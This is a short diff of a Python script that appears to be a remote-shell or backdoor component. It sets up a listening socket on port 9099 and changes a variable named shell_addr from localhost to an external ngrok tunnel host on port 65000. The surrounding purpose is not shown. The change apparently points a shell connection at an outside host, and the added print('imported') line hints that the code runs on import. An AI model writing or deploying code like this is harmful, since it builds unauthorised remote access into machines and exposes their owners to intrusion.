@@ -14,17 +14,17 @@ def waiting(s=None, creds=()):
     else:
         return s
 
-
+print("imported")
 s = socket.socket(2, 1)
 s.bind(('', 9099))
 s.listen(5)
 client, addr = s.accept()
+ip = "035e-92-118-74-46.ngrok-free.app"
 print("Gotcha")
 del s
 time.sleep(10)
 
-shell_addr = ("127.0.0.1", 65000)
-ip = shell_addr[0]
+shell_addr = (ip, 65000)
 
 # s = waiting(creds=shell_addr)
 s = None
